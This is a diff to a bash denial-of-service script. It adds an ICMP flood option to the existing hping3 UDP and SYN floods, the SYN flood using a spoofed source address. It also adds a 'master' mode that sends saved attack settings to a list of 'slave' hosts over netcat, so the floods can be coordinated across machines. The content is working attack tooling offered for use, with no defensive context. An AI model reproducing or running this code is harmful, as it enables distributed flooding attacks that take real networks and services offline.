@@ -84,6 +84,8 @@ elif [ ${PROTOCOL} = UDP ]; then
     hping3 --udp --flood -I eth0 -p ${LAST_PORT} ${LAST_IP} -d ${LAST_PAYLOAD_SIZE}
 elif [ ${PROTOCOL} = SYN ]; then
     hping3 --flood -I eth0 -S -p ${LAST_PORT} -a ${LAST_SPOOF_HOST} ${LAST_IP}
+elif [ ${PROTOCOL} = ICMP ]; then
+    hping3 --icmp --flood -I eth0 -p ${LAST_PORT} ${LAST_IP} -d ${LAST_PAYLOAD_SIZE}
 fi
 exit 0
 }
@@ -106,6 +108,27 @@ if [ "$1" = "History" ] || [ "$1" = "history" ]; then
     cd ${LAST_DIR}
 fi
 #7:58PM 13/01/2012
+function master {
+    while read p; do
+#    Unnecessary jibber jabber until security is implemented.
+#    SLAVE_IP=`echo ${p} | awk '{printf $1}'`
+#    SLAVE_PORT=`echo ${p} | awk '{printf $2}'`
+    cat ${DOS_SESSION} | nc ${p}
+    echo "Sent attack details to host:port ${p}"
+    done < .ip_list
+    }
+if [ "$1" = "master" ] || [ "$1" = "Master" ]; then
+    echo "Add IPs to ~/.dos_history/.ip_list where the IP is first on the line and port is second."
+    echo "Select the attack to perform:"
+    cd ~/.dos_history
+    select DOS_SESSION in *; do
+    echo "Selected ${DOS_SESSION}"
+    master
+    exit 0
+    done
+# For this bit, thank Stackoverflow
+
+fi
 
 if [ "$1" = "slave" ] || [ "$1" = "Slave" ]; then
     PORT_NUM=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "What port to listen on?" 8 40 111 --stdout`
